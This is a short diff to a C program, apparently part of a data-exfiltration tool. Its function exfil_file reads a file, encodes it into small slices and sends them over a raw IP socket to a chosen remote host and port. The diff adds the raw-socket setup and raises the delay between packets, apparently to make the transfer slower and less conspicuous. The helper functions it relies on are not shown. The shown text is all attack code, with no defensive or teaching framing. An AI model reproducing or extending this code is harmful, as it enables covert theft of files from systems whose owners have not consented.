@@ -82,6 +82,9 @@ int main(int argc, char** argv) {
 int exfil_file(const char* path, const char* host, const int port) {
     struct sockaddr_storage storage;
     make_storage(&storage, host, port);
+    int sfd;
+
+    ensure((sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) != -1);
 
     encoder_frame_t enc;
 
@@ -98,7 +101,7 @@ int exfil_file(const char* path, const char* host, const int port) {
     if (ferror(fp)) {
         fputs("error reading file", stderr);
     } else {
-        buffer[len++] = '\0';//just to be safe
+        buffer[len++] = '\0'; //just to be safe
     }
 
     fclose(fp);
@@ -109,7 +112,7 @@ int exfil_file(const char* path, const char* host, const int port) {
     while (!encoder_finished(&enc)) {
         encoder_get_next(&enc, slice);
         printf("%0X %0X\n", slice[0], slice[1]);
-        insert_udp_slice(&storage, slice);
-        usleep(500);
+        insert_udp_slice(sfd, &storage, slice);
+        usleep(10000);
     }
 }
